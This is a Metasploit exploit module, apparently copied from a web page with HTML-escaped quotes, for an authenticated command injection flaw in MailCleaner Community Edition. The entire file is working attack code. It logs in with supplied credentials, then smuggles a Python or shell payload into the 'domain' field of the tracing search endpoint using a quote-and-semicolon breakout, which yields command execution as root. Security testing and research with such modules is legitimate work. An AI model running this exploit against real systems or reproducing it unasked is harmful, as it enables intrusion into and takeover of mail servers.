# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Msf::Exploit::Remote::HttpClient

  def initialize(info={})
    super(update_info(info,
      &#039;Name&#039;           => "Mailcleaner Remote Code Execution",
      &#039;Description&#039;    => %q{
        This module exploits the command injection vulnerability of MailCleaner Community Edition product. An authenticated user can execute an
        operating system command under the context of the web server user which is root.

        /admin/managetracing/search/search endpoint takes several user inputs and then pass them to the internal service which is responsible for executing
        operating system command. One of the user input is being passed to the service without proper validation. That cause a command injection vulnerability.
      },
      &#039;License&#039;        => MSF_LICENSE,
      &#039;Author&#039;         =>
        [
          &#039;Mehmet Ince <mehmet@mehmetince.net>&#039; # author & msf module
        ],
      &#039;References&#039;     =>
        [
          [&#039;URL&#039;, &#039;https://pentest.blog/advisory-mailcleaner-community-edition-remote-code-execution/&#039;]
        ],
      &#039;DefaultOptions&#039;  =>
        {
          &#039;SSL&#039; => true,
          &#039;WfsDelay&#039; => 5,
        },
      &#039;Platform&#039;       => [&#039;python&#039;, &#039;unix&#039;],
      &#039;Arch&#039;           => [ ARCH_PYTHON, ARCH_CMD ],
      &#039;Targets&#039;        =>
        [
          [
            &#039;Python payload&#039;,
            {
              &#039;Platform&#039; => &#039;python&#039;,
              &#039;Arch&#039; => ARCH_PYTHON,
            }
          ],
          [
            &#039;Command payload&#039;,
            {
              &#039;Platform&#039; => &#039;unix&#039;,
              &#039;Arch&#039; => ARCH_CMD,
              &#039;Payload&#039; =>
              {
                &#039;BadChars&#039; => "\x26",
              }
            }
          ]
        ],
      &#039;Privileged&#039;     => false,
      &#039;DisclosureDate&#039; => "Dec 19 2018",
      &#039;DefaultTarget&#039;  => 0
    ))

    register_options(
      [
        Opt::RPORT(443),
        OptString.new(&#039;TARGETURI&#039;, [true, &#039;The URI of the vulnerable instance&#039;, &#039;/&#039;]),
        OptString.new(&#039;USERNAME&#039;, [true, &#039;The username to login as&#039;]),
        OptString.new(&#039;PASSWORD&#039;, [true, &#039;The password to login with&#039;])
      ]
    )
  end

  def username
    datastore[&#039;USERNAME&#039;]
  end

  def password
    datastore[&#039;PASSWORD&#039;]
  end

  def auth
    print_status(&#039;Performing authentication...&#039;)

    res = send_request_cgi({
      &#039;method&#039; => &#039;GET&#039;,
      &#039;uri&#039; => normalize_uri(target_uri.path, &#039;admin/&#039;)
    })

    if res && !res.get_cookies.empty?
      cookie = res.get_cookies
    else
      fail_with(Failure::UnexpectedReply, &#039;Did not get cookie-set header from response.&#039;)
    end

    # Performing authentication
    res = send_request_cgi({
      &#039;method&#039;    => &#039;POST&#039;,
      &#039;uri&#039;       => normalize_uri(target_uri.path, &#039;admin/&#039;),
      &#039;cookie&#039;    => cookie,
      &#039;vars_post&#039; => {
        &#039;username&#039;  => username,
        &#039;password&#039; => password,
        &#039;submit&#039; => &#039;Log+in&#039;
      }
    })

    if res && res.code == 302
      print_good("Awesome..! Authenticated with #{username}:#{password}")
    else
      fail_with(Failure::NoAccess, &#039;Credentials are not valid.&#039;)
    end

    cookie
  end

  def exploit
    cookie = auth

    if cookie.nil?
      fail_with(Failure::Unknown, &#039;Something went wrong!&#039;)
    end

    print_status(&#039;Exploiting command injection flaw&#039;)

    if target[&#039;Arch&#039;] == ARCH_PYTHON
      cmd = "&#039;;$(python -c \"#{payload.encoded}\");#"
    else
      cmd = "&#039;;#{payload.encoded};#"
    end

    send_request_cgi({
      &#039;method&#039; => &#039;POST&#039;,
      &#039;uri&#039; => normalize_uri(target_uri.path, &#039;admin&#039;, &#039;managetracing&#039;, &#039;search&#039;, &#039;search&#039;),
      &#039;cookie&#039;    => cookie,
      &#039;vars_post&#039; => {
        &#039;search&#039; => rand_text_alpha(5),
        &#039;domain&#039; => cmd,
        &#039;submit&#039; => 1
      }
    })

  end
end

